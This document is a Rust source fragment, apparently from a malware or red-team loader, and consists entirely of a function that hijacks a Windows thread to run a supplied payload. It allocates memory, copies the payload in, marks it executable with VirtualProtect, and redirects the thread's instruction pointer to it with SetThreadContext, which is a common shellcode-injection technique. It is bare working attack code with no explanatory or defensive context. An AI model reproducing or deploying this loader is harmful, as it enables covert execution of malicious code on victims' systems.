#[allow(deprecated)]
fn hijack_thread(thread_handle: *mut c_void, payload: &[u8], payload_size: usize) -> bool {
    unsafe {
        let paddress = VirtualAlloc(
            std::ptr::null_mut(),
            payload_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if paddress.is_null() {
            println!("[-] VirtualAlloc failed with error: {}", GetLastError());
            return false;
        }

        copy_nonoverlapping(payload.as_ptr(), paddress as *mut u8, payload_size);

        let mut old_protect: u32 = 0;

        let status = VirtualProtect(paddress, payload_size, PAGE_EXECUTE_READ, &mut old_protect);

        if status == 0 {
            println!("[-] VirtualProtect failed with error: {}", GetLastError());
            return false;
        }

        let mut thread_context: CONTEXT = std::mem::zeroed();
        thread_context.ContextFlags = CONTEXT_ALL;

        let status = GetThreadContext(thread_handle, &mut thread_context);

        if status == 0 {
            println!("[-] GetThreadContext failed with error: {}", GetLastError());
            return false;
        }

        thread_context.Rip = paddress as u64;

        let status = SetThreadContext(thread_handle, &mut thread_context);

        if status == 0 {
            println!("[-] SetThreadContext failed with error: {}", GetLastError());
            return false;
        }
    }

    true
}

